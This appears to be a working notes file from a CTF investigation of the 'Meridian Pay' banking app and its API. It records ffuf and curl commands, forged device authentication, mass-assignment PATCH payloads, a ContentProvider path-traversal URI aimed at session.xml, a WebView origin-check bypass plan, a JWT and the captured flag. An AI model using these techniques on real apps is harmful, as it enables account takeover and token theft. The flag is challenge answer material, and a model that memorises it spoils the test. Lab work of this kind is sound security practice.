@@ -1,0 +1,744 @@
+MERIDIAN PAY CTF — CHAT + CHALLENGE MEMORY
+=============================================
+
+Purpose
+-------
+This file is a working record of the Meridian Pay CTF investigation so far. It consolidates the relevant conversation findings, commands, APK analysis, API behavior, confirmed flag, vulnerabilities, and the current next steps.
+
+CHALLENGE
+---------
+Target:
+https://web-f747413d78eddd9f.web.h7tex.com
+
+Challenge description:
+“Meridian Pay is a neobank that shipped in a hurry and trusts everyone: the client trusts the server, the server trusts the client, and both trust the phone underneath. Four separate cracks are hiding in that arrangement, some in the app and some in the API behind it, one flag each.”
+
+Expected theme:
+Four separate vulnerabilities/cracks, one flag each.
+
+USER ENVIRONMENT
+----------------
+Kali Linux.
+Shell prompt:
+vaibhav@kali
+
+Decoded APK directory:
+~/meridian_decoded
+
+APK-related tools currently available:
+- /usr/bin/adb
+- /bin/aapt
+- /usr/bin/apktool
+- /usr/bin/java
+- jadx is NOT installed
+- Android emulator is NOT installed
+
+adb devices:
+No devices/emulators are currently attached.
+
+Android SDK:
+~/Android/Sdk was not present / no useful SDK installation was found.
+
+The current machine therefore cannot directly execute the Android app or invoke its ContentProvider through adb yet.
+
+============================================================
+1. API BASICS
+============================================================
+
+Base target:
+$BASE
+= https://web-f747413d78eddd9f.web.h7tex.com
+
+GET /
+returns:
+{"service":"Meridian Pay API","version":"3.2.1"}
+
+Required client header:
+X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)
+
+Device authentication:
+POST /api/v1/auth/device
+
+A forged/arbitrary device_id was accepted and returned a user/token.
+
+Example behavior:
+device_id "admin" still returned user 1001, Alicia Reyes.
+
+This demonstrates that the server does not actually trust a cryptographically attested device identity; the client-controlled device ID is not identity proof.
+
+JWT observed:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwiaWF0IjoxNzkwNDAwOTIxLCJleHAiOjE3OTA0ODczMjF9.FDNcU9ePKCoPUvNw4tvqY04Ktt0OawOX2UY90FjOP3k
+
+Decoded payload:
+sub = 1001
+iat = 1790400921
+exp = 1790487321
+
+============================================================
+2. CONFIRMED FLAG #1
+============================================================
+
+GET /api/v1/promo/public
+
+returns HTML similar to:
+
+<html><body>
+<h3>Meridian Pay - Seasonal Offers</h3>
+<p>Refer a friend and earn 500 points. Terms apply.</p>
+<p>Enrolled members can finish loyalty sign-up in the app:
+<a href="/api/v1/internal/promo">complete enrollment</a>.
+</p>
+</body></html>
+
+Using a valid bearer token plus the exact Meridian client header:
+
+GET /api/v1/internal/promo
+
+returns:
+
+<html><body>
+<h3>Meridian Pay - Loyalty Enrollment</h3>
+<p>Welcome back, member 1001. Enrollment confirmation:</p>
+<pre>H7CTF{3cb5bf7f-294c-4342-9e39-2097850947d6}</pre>
+</body></html>
+
+CONFIRMED FLAG #1:
+H7CTF{3cb5bf7f-294c-4342-9e39-2097850947d6}
+
+Authentication behavior:
+- Missing/invalid bearer => 401
+- Valid bearer + fake client header => 403
+- Valid bearer + exact client header => 200
+
+This flag demonstrates the first client/server trust weakness.
+
+============================================================
+3. API ROUTE ENUMERATION
+============================================================
+
+Many guessed routes were tested and returned 404.
+
+Manual tested routes included:
+profile
+loyalty
+enrollment
+export
+receipt
+receipts
+account
+settings
+config
+debug
+status
+health
+me
+user
+users
+admin
+internal
+internal/loyalty
+internal/enrollment
+internal/export
+internal/receipt
+internal/account
+internal/config
+internal/debug
+
+Only:
+GET /api/v1/profile
+exists but returns 405 because GET is not allowed.
+
+The API wordlist fuzzing was later run with a custom 45-word list.
+
+Command:
+
+ffuf -u "$BASE/api/v1/FUZZ" \
+  -w /tmp/api_words.txt \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' \
+  -mc all \
+  -fc 404 \
+  -t 5
+
+Result:
+profile [Status: 405, Size: 153, Words: 16, Lines: 6]
+
+No other result.
+
+Internal scan:
+
+ffuf -u "$BASE/api/v1/internal/FUZZ" \
+  -w /tmp/api_words.txt \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' \
+  -mc all \
+  -fc 404 \
+  -t 5
+
+Result:
+promo [Status: 200, Size: 180, Words: 10, Lines: 1]
+
+Thus random API route brute-forcing has not revealed additional endpoints.
+
+The SecLists common wordlist was initially unavailable:
+ /usr/share/seclists/Discovery/Web-Content/common.txt
+did not exist.
+
+A custom list was therefore created at:
+ /tmp/api_words.txt
+
+Contents:
+auth
+device
+profile
+promo
+internal
+admin
+user
+users
+account
+accounts
+me
+self
+session
+sessions
+token
+tokens
+key
+keys
+flag
+flags
+secret
+secrets
+debug
+config
+settings
+status
+health
+info
+loyalty
+enrollment
+redeem
+rewards
+points
+export
+receipt
+receipts
+payment
+payments
+transfer
+transactions
+transaction
+beneficiary
+beneficiaries
+member
+members
+
+============================================================
+4. /api/v1/profile MASS ASSIGNMENT
+============================================================
+
+OPTIONS /api/v1/profile reports:
+Allow: OPTIONS, PATCH
+
+GET/POST/PUT/DELETE/HEAD are not allowed.
+PATCH is allowed.
+
+The endpoint accepts arbitrary profile fields.
+
+Examples tested:
+
+PATCH {"name":"test"}
+=> updated ["name"]
+
+PATCH {}
+=> updated []
+
+PATCH {"user_id":1}
+=> updated ["user_id"]
+
+PATCH {"is_admin":true}
+=> updated ["is_admin"]
+
+PATCH {"role":"admin"}
+=> profile role became admin
+=> updated ["role"]
+
+PATCH {"role":"admin","tier":"premium"}
+=> profile role admin/tier premium
+
+This is a confirmed mass-assignment vulnerability.
+
+Important:
+Changing user_id did NOT change the identity used by /api/v1/internal/promo.
+Promo continued to say:
+member 1001
+
+Adding:
+X-Role: admin
+did not change authorization behavior.
+
+Current profile may have been modified to:
+role = admin
+tier = premium
+and user_id may have been tested/changed.
+
+Do NOT assume that mass assignment itself has produced a flag yet.
+
+Likely next API test:
+PATCH profile with candidate privilege fields one at a time:
+is_admin
+is_staff
+is_superuser
+admin
+administrator
+role
+permissions
+permission
+tier
+plan
+verified
+internal
+staff
+privileged
+loyalty_enrolled
+enrolled
+
+Then inspect:
+GET /api/v1/profile
+using the proper auth/client headers.
+
+Also test all HTTP methods on /profile, especially OPTIONS and PATCH.
+
+Potential command already prepared:
+
+for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do
+    echo "===== $m ====="
+    curl -sk -i -X "$m" "$BASE/api/v1/profile" \
+      -H "Authorization: Bearer $TOKEN" \
+      -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' \
+      -H 'Content-Type: application/json' \
+      --data '{"role":"admin"}' | head -20
+done
+
+Privilege-field test:
+
+for field in \
+is_admin \
+is_staff \
+is_superuser \
+admin \
+administrator \
+role \
+permissions \
+permission \
+tier \
+plan \
+verified \
+internal \
+staff \
+privileged \
+loyalty_enrolled \
+enrolled
+do
+    echo "===== $field ====="
+    curl -sk -X PATCH "$BASE/api/v1/profile" \
+      -H "Authorization: Bearer $TOKEN" \
+      -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' \
+      -H 'Content-Type: application/json' \
+      -d "{\"$field\":true}"
+    echo
+done
+
+Profile inspection:
+
+curl -sk "$BASE/api/v1/profile" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' | jq .
+
+============================================================
+5. APK MANIFEST
+============================================================
+
+The Android manifest revealed:
+
+MainActivity:
+- exported=true
+- launcher activity
+
+RouterActivity:
+- exported=true
+- intent filter:
+  meridianpay://open
+- intent filter:
+  https://links.meridianpay.io/open
+- pathPrefix:
+  /open
+- autoVerify=false
+
+WebViewActivity:
+- exported=false
+
+ExportProvider:
+- authority:
+  com.meridian.pay.export
+- exported=true
+- grantUriPermissions=true
+
+Application also has:
+INTERNET
+allowBackup=true
+usesCleartextTraffic=true
+
+============================================================
+6. CONFIRMED / HIGH-CONFIDENCE APK VULNERABILITY #2/#3 CANDIDATE:
+EXPORTPROVIDER PATH TRAVERSAL
+============================================================
+
+ExportProvider.smali openFile():
+
+It gets:
+getFilesDir()
+
+then appends:
+"receipts"
+
+It gets:
+Uri.getPath()
+
+If path starts with:
+"/files/"
+it strips that prefix.
+
+Then it constructs:
+new File(receiptsDir, p1)
+
+and opens the file.
+
+There is NO canonicalization/path-containment check.
+
+Therefore a URI such as:
+
+content://com.meridian.pay.export/files/../../shared_prefs/session.xml
+
+is a path traversal candidate.
+
+The provider's intended root is effectively:
+<data dir>/files/receipts
+
+but a traversal can escape it.
+
+Potential targets:
+shared_prefs/session.xml
+other app-private files
+possibly files outside the app sandbox if sufficient ../ traversal is accepted
+
+The app seeds:
+files/receipts/receipt-8827.txt
+
+with:
+
+Meridian Pay receipt
+Account MP-0041-8827
+Amount: $18.42
+Status: settled
+
+The exact source file showed the provider logic and receipt setup.
+
+However:
+WE HAVE NOT YET EXECUTED THIS EXPLOIT.
+
+Reason:
+No Android emulator/device is available.
+
+adb devices:
+List of devices attached
+(no devices)
+
+adb shell content query therefore currently returns:
+adb: no devices/emulators found
+
+Need Android runtime/device before this can be tested directly.
+
+============================================================
+7. SESSION STORAGE
+============================================================
+
+Session.smali uses SharedPreferences named:
+
+"session"
+
+Stored values:
+base_url
+session_token
+account_name
+device_id
+
+Session.baseUrl() default:
+http://10.0.2.2:8080
+
+Session.setBaseUrl():
+- strips trailing slashes
+- stores arbitrary URL
+- performs no validation
+
+This is important for the WebView vulnerability.
+
+============================================================
+8. WEBVIEW / DEEP-LINK VULNERABILITY
+============================================================
+
+RouterActivity is exported and accepts external intents.
+
+It reads the Intent data and extracts query parameter:
+"url"
+
+If missing, it uses:
+baseUrl + "/api/v1/promo/public"
+
+Then starts WebViewActivity with extra:
+"url"
+
+WebViewActivity:
+- creates a WebView
+- JavaScript is enabled
+- gets the URL
+- gets session/base URL
+- checks:
+  url.startsWith(baseUrl)
+- if true, adds:
+  Authorization: Bearer <token>
+  X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)
+- then calls:
+  WebView.loadUrl(url, headers)
+
+The important bug:
+startsWith(baseUrl) is not a safe origin check.
+
+For example, conceptually:
+https://trusted.example
+and
+https://trusted.example.attacker.example
+can share a prefix while being different origins.
+
+The actual challenge exploit still needs to be demonstrated.
+
+There is also a base URL setting in MainActivity:
+The user can enter a server field.
+The app directly trims the value and calls:
+Session.setBaseUrl()
+No validation is performed.
+
+Potential consequence:
+The WebView may be tricked into loading an attacker-controlled URL while attaching the bearer token and Meridian client header, depending on exact URL construction and runtime behavior.
+
+Again:
+DO NOT CLAIM THIS FLAG IS FOUND YET.
+It is a strong vulnerability candidate based on the APK.
+
+============================================================
+9. APK API CLIENT
+============================================================
+
+ApiClient.smali contains:
+
+CLIENT_HEADER:
+MeridianPay-Android/3.2.1 (attested)
+
+get():
+- creates HttpURLConnection
+- applies arbitrary headers
+
+post():
+- sets Content-Type application/json
+- applies headers
+
+MainActivity authentication flow parses:
+"token"
+"name"
+
+No static H7CTF flag was found elsewhere in the decoded APK.
+
+Searches showed no obvious flag string outside the already obtained server response.
+
+============================================================
+10. OTHER APK FINDINGS
+============================================================
+
+No assets/files containing obvious flags were found.
+
+Decoded APK file tree consisted primarily of:
+manifest
+apktool.yml
+META-INF
+res
+smali
+
+No obvious:
+H7CTF
+flag
+secret
+callback
+webhook
+redirect
+
+strings were found in the static APK analysis beyond relevant app/API strings.
+
+============================================================
+11. FOUR-CRACK WORKING THEORY
+============================================================
+
+Challenge says four separate cracks, one flag each.
+
+Current working mapping:
+
+Crack 1:
+Client/device trust / forged device authentication
+=> FLAG CONFIRMED:
+H7CTF{3cb5bf7f-294c-4342-9e39-2097850947d6}
+
+Crack 2:
+API mass assignment via PATCH /api/v1/profile
+=> vulnerability CONFIRMED
+=> flag NOT FOUND yet
+
+Crack 3:
+Exported ContentProvider path traversal
+=> vulnerability HIGH-CONFIDENCE / CONFIRMED FROM CODE
+=> runtime exploitation NOT YET EXECUTED
+=> flag NOT FOUND
+
+Crack 4:
+Exported RouterActivity + WebView URL prefix validation / authenticated header leakage
+=> vulnerability HIGH-CONFIDENCE / CONFIRMED FROM CODE
+=> runtime exploitation NOT YET EXECUTED
+=> flag NOT FOUND
+
+This mapping is a working hypothesis, not a final confirmed mapping for flags 2-4.
+
+============================================================
+12. CURRENT STATUS
+============================================================
+
+CONFIRMED:
+[✓] API reachable
+[✓] Client header behavior understood
+[✓] Forged device authentication
+[✓] FLAG #1 recovered
+[✓] /profile PATCH mass assignment
+[✓] ExportProvider traversal bug in APK
+[✓] Deep-link/WebView prefix validation bug in APK
+[✓] API fuzzing with custom wordlist
+[✓] No additional obvious API routes discovered
+
+NOT YET DONE:
+[ ] Find Flag #2 from mass assignment
+[ ] Execute ExportProvider traversal
+[ ] Find flag through Provider
+[ ] Execute/test WebView/deep-link exploit
+[ ] Find flag through WebView
+[ ] Confirm all four flags
+
+============================================================
+13. IMMEDIATE NEXT STEPS
+============================================================
+
+A. Finish mass-assignment testing.
+
+Run:
+
+curl -sk "$BASE/api/v1/profile" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' | jq .
+
+Then test likely fields individually using PATCH.
+
+B. Re-authenticate after changing profile and inspect whether the new JWT changes.
+
+Use:
+POST /api/v1/auth/device
+
+with the same valid client header and a device_id.
+
+Decode the returned JWT.
+
+Earlier token payload only contained:
+sub, iat, exp
+so a role-based JWT claim is not currently expected, but it is worth verifying after profile mutation.
+
+C. Obtain an Android runtime only when needed.
+
+Current machine has adb but no emulator and no attached device.
+
+D. Once Android runtime exists, invoke:
+
+adb shell content query \
+  --uri content://com.meridian.pay.export/files/../../shared_prefs/session.xml
+
+If URI normalization interferes, test encoded traversal forms.
+
+E. Investigate WebView/deep-link using an Android runtime.
+
+Likely relevant intent shape:
+meridianpay://open?...url=...
+
+RouterActivity reads query parameter:
+url
+
+The important condition in WebViewActivity is:
+url.startsWith(baseUrl)
+
+Need to construct a URL that passes this check but causes a request to a different origin, or manipulate baseUrl through the app's server/base URL setting.
+
+============================================================
+14. IMPORTANT CAUTIONS
+============================================================
+
+Do not keep randomly guessing hundreds of API endpoints; current fuzzing strongly suggests the API surface is intentionally small.
+
+Do not claim a flag merely because a vulnerability is confirmed.
+
+Flag #1 is the only flag confirmed so far.
+
+Mass assignment is confirmed, but its flag trigger is unknown.
+
+Provider traversal is confirmed from static code, but needs runtime execution.
+
+WebView header leakage is strongly indicated by code, but needs runtime exploitation.
+
+The challenge likely expects the player to combine static APK analysis with server-side API testing.
+
+============================================================
+15. USER'S LATEST TERMINAL RESULTS
+============================================================
+
+The latest custom ffuf scan returned:
+
+/api/v1/FUZZ:
+profile [Status: 405, Size: 153, Words: 16, Lines: 6]
+
+/api/v1/internal/FUZZ:
+promo [Status: 200, Size: 180, Words: 10, Lines: 1]
+
+The original SecLists attempt failed because:
+ /usr/share/seclists/Discovery/Web-Content/common.txt
+does not exist.
+
+Current Android tooling:
+adb exists
+emulator absent
+aapt exists
+apktool exists
+jadx absent
+java exists
+
+adb devices:
+no devices/emulators found.
+
+============================================================
+16. CONFIRMED FLAG
+============================================================
+
+H7CTF{3cb5bf7f-294c-4342-9e39-2097850947d6}
+
+END OF MERIDIAN PAY CTF MEMORY
